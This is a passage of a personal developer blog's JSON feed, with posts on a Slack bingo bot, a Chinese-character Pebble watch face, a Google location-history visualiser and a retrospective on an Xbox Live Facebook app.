reactions.add</a>.\nIf you increase the <code>logLevel</code>, you can see which events are being triggered.</p>\n<p>We start the WebSocket connection (Real Time Messaging) <a href=\"https://github.com/bcaller/slack-bingo-bot/blob/5145b89ee1ca3e9b830ea816d4e8d8991be25945/index.js#L26\">with</a></p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">var</span> controller <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'botkit'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">slackbot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ncontroller<span class=\"token punctuation\">.</span><span class=\"token function\">spawn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    <span class=\"token literal-property property\">token</span><span class=\"token operator\">:</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">SLACK_TOKEN</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">startRTM</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<p>We spy on all messages <a href=\"https://github.com/bcaller/slack-bingo-bot/blob/5145b89ee1ca3e9b830ea816d4e8d8991be25945/index.js#L114\">with</a></p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\">controller<span class=\"token punctuation\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ambient'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">bot<span class=\"token punctuation\">,</span> message</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">/*process message*/</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre>\n<p>We can reply to <code>message</code> with <code>bot.reply(message, {/*reply data*/})</code></p>\n<p>Listen for bingo's secret direct message &quot;cheat&quot;:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\">controller<span class=\"token punctuation\">.</span><span class=\"token function\">hears</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cheat'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'direct_message'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">bot<span class=\"token punctuation\">,</span> message</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">react</span><span class=\"token punctuation\">(</span>bot<span class=\"token punctuation\">,</span> <span class=\"token string\">'wink'</span><span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">,</span> noop<span class=\"token punctuation\">)</span>\n    bot<span class=\"token punctuation\">.</span><span class=\"token function\">reply</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">,</span> words<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">w</span> <span class=\"token operator\">=></span> w<span class=\"token punctuation\">.</span>word<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">', '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre>\n<p>Things get more complicated when you need to have actual conversations with your bots and deal with multiple teams,\nbut this is a quick way to get started.</p>\n",
			"date_published": "2016-02-07T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/pebble-xin-nian-kuai-le/",
			"url": "https://blog.caller.xyz/pebble-xin-nian-kuai-le/",
			"title": "Pebble 新年快乐",
			"content_html": "<p>My new watch face for celebrating year of the monkey is <a href=\"https://apps.getpebble.com/en_US/application/569e7467eeede1ab4400002a\">available on the Pebble app store</a>.\nIt displays the date and day of the week in Chinese characters, along with the year's zodiac animal.\nThe design ended up being too cluttered, maybe a little ugly, but being a sinophile I quite like it.\nI just wanted a watch face with the date / weekday in Chinese characters, but with the time still in easy-(for me)-to-read Arabic numerals.</p>\n<h1 id=\"screenshots\" tabindex=\"-1\">Screenshots <a class=\"header-anchor\" href=\"https://blog.caller.xyz/pebble-xin-nian-kuai-le/\">#</a></h1>\n<p>Date format: <em>{month 1-12}</em> + 月 <span class=\"pyin\"><span class=\"pyin4 pyineiv\">yuè</span></span> + <em>{day 1-31}</em> + 日 <span class=\"pyin\"><span class=\"pyin4 pyineiv\">rì</span></span></p>\n<p><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/FCcwmXmoHA-148.avif 148w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/FCcwmXmoHA-148.webp 148w\"><img alt=\"\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/FCcwmXmoHA-148.png\" width=\"148\" height=\"172\"></picture>\n<picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/IGv6T6RiHw-148.avif 148w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/IGv6T6RiHw-148.webp 148w\"><img alt=\"\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/IGv6T6RiHw-148.png\" width=\"148\" height=\"172\"></picture>\n<picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/wPfMPl2sxa-148.avif 148w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/wPfMPl2sxa-148.webp 148w\"><img alt=\"\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/wPfMPl2sxa-148.png\" width=\"148\" height=\"172\"></picture></p>\n<p>It's still year of the goat.</p>\n<ol>\n<li>一月五日星期三7点半 Half past 7 on Wednesday 5 January.</li>\n<li>一月二十七日星期六17点3分 17:03 on Saturday 27 January</li>\n<li>Showing the character for luck 福 <span class=\"pyin\"><span class=\"pyin2 pyineiv\">fú</span></span> on a Chinese lantern (upside down as per tradition)</li>\n</ol>\n<p><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/DyOhegPnYW-148.avif 148w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/DyOhegPnYW-148.webp 148w\"><img alt=\"\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/DyOhegPnYW-148.png\" width=\"148\" height=\"172\"></picture>\n<picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/BVVrRouUqw-148.avif 148w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/BVVrRouUqw-148.webp 148w\"><img alt=\"\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/BVVrRouUqw-148.png\" width=\"148\" height=\"172\"></picture></p>\n<p>Year of the monkey begins 2016年2月8号！</p>\n<h1 id=\"code\" tabindex=\"-1\">Code <a class=\"header-anchor\" href=\"https://blog.caller.xyz/pebble-xin-nian-kuai-le/\">#</a></h1>\n<p>I programmed it in C because I'm that hardcore (and because Pebble).\nChinese fonts are huge. Since I only required a subset of fonts, I used FontForge to extract the characters I needed from a Chinese font, and reassign the glyphs to Latin characters. I generated a FontForge script for extracting and mapping the glyphs, e.g. 星➡X</p>\n<pre><code>SelectAll()\n\nSelectFewer(0u661f)\nSelectFewer(&lt;CODE OF CHINESE CHARACTER&gt;)...\n\nDetachAndRemoveGlyphs()\n\nSelectNone()\nSelect(0u661f)\nSetUnicodeValue(0u58)\n\nSelectNone()\nSelect(&lt;CODE OF CHINESE CHARACTER&gt;)\nSetUnicodeValue(&lt;CODE OF LATIN CHARACTER TO MAP TO&gt;)...\n\nReencode(&quot;latin1&quot;)\nReencode(&quot;compacted&quot;)\n</code></pre>\n<p>I didn't bother to read the FontForge docs so there is probably an easier way. I then had to make some manual modifications to the weight, size and position of the font to get it to display nicely on the Pebble.</p>\n<p>Source is at <a href=\"https://github.com/bcaller/pebble-cny-chinese\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\"> bcaller/pebble-cny-chinese</a>.</p>\n",
			"date_published": "2016-01-25T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/they-have-your-info/",
			"url": "https://blog.caller.xyz/they-have-your-info/",
			"title": "They Have Your Info",
			"content_html": "<p><strong>Project abandoned, sorry</strong></p>\n<p>They have your info. Your life has been mapped. What does Google's location reporting reveal about you?\nIf you use Google products on your phone, you may be surprised by the hundreds of thousands of data points gathered each year.\nJust remember, you have nothing to fear…</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/JFSS5A89qW-1132.avif 1132w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/JFSS5A89qW-1132.webp 1132w\"><img alt=\"I lived near Paris and in Saint-Martin-d'Hères\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/JFSS5A89qW-1132.png\" width=\"1132\" height=\"1194\"></picture><figcaption>I lived near Paris and in Saint-Martin-d'Hères</figcaption></figure><p></p>\n<p>Between December 2012 and January 2016, Google has recorded my location <strong>701,564 times</strong>.\nYou can download your location history from <a href=\"https://takeout.google.com/settings/takeout\">Google Takeout</a> showing where your Android phone has tracked you. It's quite creepy.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/TZUYGcQbhs-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/TZUYGcQbhs-1200.webp 1200w\"><img alt=\"Caught skiing at 2400m at Les 2 Alpes with a nice 'Street'-view. Not 100% certain of the velocity units.\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/TZUYGcQbhs-1200.png\" width=\"1200\" height=\"719\"></picture><figcaption>Caught skiing at 2400m at Les 2 Alpes with a nice 'Street'-view. Not 100% certain of the velocity units.</figcaption></figure><p></p>\n<p>Most time points contain latitude and longitude, but for some points (e.g. whilst navigating with Maps) they have your speed and heading.\nBy analysing this data, <code>TheyHaveYour.Info</code> can infer places you have lived and worked, calculate your median arrival time at work, see where you go at weekends, where you went on vacations, what you normally do at 3:45pm on a Tuesday, etc.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/LYsg1qiB-7-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/LYsg1qiB-7-1200.webp 1200w\"><img alt=\"Where I spent my time in Grenoble, though the median departure time marks me out as a bit of a slacker\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/LYsg1qiB-7-1200.png\" width=\"1200\" height=\"552\"></picture><figcaption>Where I spent my time in Grenoble, though the median departure time marks me out as a bit of a slacker</figcaption></figure><p></p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/1owSNtAqp3-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/1owSNtAqp3-1200.webp 1200w\"><img alt=\"I went wakeboarding at the awesome Exo 38 in Tencin, but never on a Monday\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/1owSNtAqp3-1200.png\" width=\"1200\" height=\"653\"></picture><figcaption>I went wakeboarding at the awesome Exo 38 in Tencin, but never on a Monday</figcaption></figure><p></p>\n<p>To avoid processing user location data, the web app works client side. I felt it could make use of the Google Maps / Places API since Google already has your data. You browser may stall as it reads the 189.5 MB LocationHistory.json file file - just wait. When I built this, Web Workers were not the solution because of having to transfer the massive location history object.</p>\n<p>Alas, Google now has a pretty decent website for viewing your location data (I did record a lot of traffic from Mountain View after I released this). But maybe consider turning off location history.</p>\n<p><strong>STATUS:</strong> It works, I'm proud of it, but I'm not likely to update it. <strong>Don't</strong> try it out at <code>theyhaveyour.info</code> - I stopped paying for the domain and now it's a malware.</p>\n<h3 id=\"libraries-tech\" tabindex=\"-1\">Libraries / Tech <a class=\"header-anchor\" href=\"https://blog.caller.xyz/they-have-your-info/\">#</a></h3>\n<ul>\n<li><a href=\"https://bcaller.github.io/ClusterFlag\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">ClusterFlag</a> - My Google Maps marker clustering library because the other client side libraries will die trying to show 700k data points.\nOther libraries recalculate the clusters each time you move the map! ClusterFlag does take a while to pre-compute the clusters,\nbut finding which points are within an area is fast.</li>\n<li>JSZip - Yes, apparently you can read ZIP files in javascript!</li>\n<li>Google Maps API</li>\n</ul>\n<h3 id=\"fixme-todo\" tabindex=\"-1\">FIXME / TODO <a class=\"header-anchor\" href=\"https://blog.caller.xyz/they-have-your-info/\">#</a></h3>\n<ul>\n<li>Fix daylight savings time when making histograms</li>\n<li>More timezone issues. Timezones are horrid!</li>\n<li>Use Web Workers (with workaround for large data transfer)</li>\n<li>Zooming is buggy (especially with touch gestures)</li>\n<li>Intersection of location history for 2 people</li>\n<li>Redo the view of a specific day</li>\n<li>Relative cluster size is calculated by the number of time points. The interval between readings is not constant and should be taken into account.</li>\n</ul>\n",
			"date_published": "2014-12-12T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/xbox-360-live-gamercard/",
			"url": "https://blog.caller.xyz/xbox-360-live-gamercard/",
			"title": "Xbox 360 Live Gamercard",
			"content_html": "<p>Several years back I was an avid Xbox 360 fanboy. I had also just made a couple of Facebook apps as a freelancer. At the time, there was an unofficial Xbox Live Facebook app which just showed an image containing your gamertag, picture, score and recent games as a section on your profile. This data came from a now-defunct website which was a member of Microsoft’s Xbox Community Developer Program (XCDP). Only XCDP members were allowed access to the Xbox Live API.</p>\n<p>While unable to access the official feed, I found an unsecured data feed somewhere within one of Microsoft’s servers. That night I woke up at 2am with the urge to start coding, so I got up and created the majority of what became Xbox 360 Live Gamercard (the name helped me cover all searches in the app directory).</p>\n<p>The app used Xbox Live data to show how many achievements you unlocked in each game on a tab in your Facebook profile, publish to the news feed when you unlocked new achievements in games or went online. There were also game reviews and a tracker that showed who was online and what they were playing.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/diwYlw_cO--402.avif 402w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/diwYlw_cO--402.webp 402w\"><img alt=\"Gamercard as shown on a [user](https://engtech.wordpress.com/2008/03/31/how-to-get-an-rss-feed-for-your-xbox-360-gamertag/)'s Facebook profile. The scores and achievements for recent games are shown. The gamerpoints image was not loading from Microsoft that day.\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/diwYlw_cO--402.png\" width=\"402\" height=\"346\"></picture><figcaption>Gamercard as shown on a <a href=\"https://engtech.wordpress.com/2008/03/31/how-to-get-an-rss-feed-for-your-xbox-360-gamertag/\">user</a>'s Facebook profile. The scores and achievements for recent games are shown. The gamerpoints image was not loading from Microsoft that day.</figcaption></figure><p></p>\n<h1 id=\"success\" tabindex=\"-1\">Success <a class=\"header-anchor\" href=\"https://blog.caller.xyz/xbox-360-live-gamercard/\">#</a></h1>\n<p>At its height, I had nearly 2 million registered users, which may have been the majority of Xbox Live subscribers on Facebook, although the number of monthly active users was a tenth of that. Microsoft's Xbox Live product manager contacted me saying he thought I was screen-scraping Xbox.com and would rather I become an XCDP member, so I got access to the real feeds.</p>\n<p>My initial monetization stream was stupid banner ads. AdSense didn’t work on Facebook canvas pages which have no static content. Instead, Facebook apps were full of this “You have 7 love notes” nonsense from small ad networks, but surprisingly people actually click on them, and the payout was quite good. A small amount also came from the Amazon Associates program: The app would link to Xbox games on Amazon, but after clicking the link I would receive 6% of whatever the user bought in the next 24 hours. While I sold video games, referral fees also came from the panoply of junk people bought after using my app, such as a toothbrush which sings we will rock you, sex toys and a copy of Mein Kampf. Unfortunately, Amazon paid by sending me a dollar cheque, which caused massive confusion and fees at the bank.</p>\n<p>There were also some small companies who paid for advertisement on the app. However, looking back on it I wasted a huge opportunity. I had a niche market and a good product, but I didn’t act entrepreneurially. I should have tried to sell it or make way more money or something. I don’t know.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/AG4sdk7fm--650.avif 650w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/AG4sdk7fm--650.webp 650w\"><img alt=\"A [screenshot](http://blog.yam.com/cocowang/article/24594757) of the app's canvas page showing the links for reviews, finding matches and more. Nice advertising banner at the top!\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/AG4sdk7fm--650.jpeg\" width=\"650\" height=\"544\"></picture><figcaption>A <a href=\"http://blog.yam.com/cocowang/article/24594757\">screenshot</a> of the app's canvas page showing the links for reviews, finding matches and more. Nice advertising banner at the top!</figcaption></figure><p></p>\n<p>#Code\nI am embarrassed to say that I wrote the app in ASP.NET and C#. This was not ASP.NET 4.0. My app had massive viewstate fields and controls which didn’t play nicely with the ever-changing Facebook canvas spec (a weird modified version of HTML). I also used SQL server, but the express edition which limited the database size to 4gb. Yuk. I really hadn’t expected the success. The number of people made the database size balloon and the ASP.NET code was horrible to maintain.</p>\n<p>Anyway, my profits began to decrease as the golden age of Facebook app ad revenue came to an end. I didn’t bother to maintain it regularly due to the presence of a scary competitor with a $2m seed and a superior app which also worked for PS3. Things were breaking and I was receiving terribly spelled insults by email, but I actually earned more from ad clicks on days when the site was working badly.</p>\n<p>The biggest technical flaw was the updater. This was supposed to publish any new achievements to the users' profiles. That meant calling the API for each gamertag and comparing the scores with those in the database from the last update. However, as the number of users skyrocketed, the length of time it took to loop through and check every user became too long, especially because most players wanted their updates instantly. I probably should have upgraded the server and database, but windows server is expensive, and the emails from users pissed me off, so I just allowed manual updates. The upside was that manually updating made users navigate to the app and see the ads. I'm so evil.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/E_oDTmsLZH-664.avif 664w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/E_oDTmsLZH-664.webp 664w\"><img alt=\"My epic design skills! Add your gamertag to our massive database and we will never update it OK. [Source](http://home.gamer.com.tw/creationDetail.php?sn=648591)\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/E_oDTmsLZH-664.jpeg\" width=\"664\" height=\"521\"></picture><figcaption>My epic design skills! Add your gamertag to our massive database and we will never update it OK. <a href=\"http://home.gamer.com.tw/creationDetail.php?sn=648591\">Source</a></figcaption></figure><p></p>\n<p>#Lessons</p>\n<ul>\n<li>Hire a designer!</li>\n<li>Don't invest too heavily in an appstore / platform / ecosystem / API. It's a very unsafe place, with a ruling company which changes its rules at the drop of a hat. They invite you to build your businesses in their garden, but every so often they remind you that they are the lord of the land, upon whom you now depend. They will only listen to their largest clients, and constantly change their rules at short notice. Life is good at the beginning, but soon the company stops being interested in how it treats smaller developers. When they think you are no longer welcome on their platform, you have no real chance to appeal and certainly no employment tribunal for your loss of earnings. You are working in a dictatorship. Thankfully I didn't significantly scale up my hosting requirements. I was there when Facebook apps made money for indie devs. I missed the Apple App Store boom though, and despite having a few Android apps, I don't make money from them.[^1]</li>\n<li>Be prepared for success. Build for scale. A little optimism! Use the correct tools.</li>\n<li>Be more open to business and job opportunities. I'm naturally very skeptical, so it's hard for me to agree to anything, but I should at least speak to see what people can offer me.</li>\n<li>Be more privacy conscious: The app actually became a massive public map of Facebook IDs (and therefore real names) to Xbox Live gamertags, which really was a privacy issue which I didn’t consider.</li>\n<li>Spend money to make money. But not always. My costs here were super low, but I could have invested to make something bigger rather than clinging on to my shitty VPS.</li>\n</ul>\n<p>[^1]: One interesting store I'm happy with at the moment is the Pebble store where many of the apps are free and open source. Pebble currently profit from hardware sales rather than keeping a tightly controlled app store.</p>\n",
			"date_published": "2010-01-20T00:00:00Z"
		}
		
	]
}
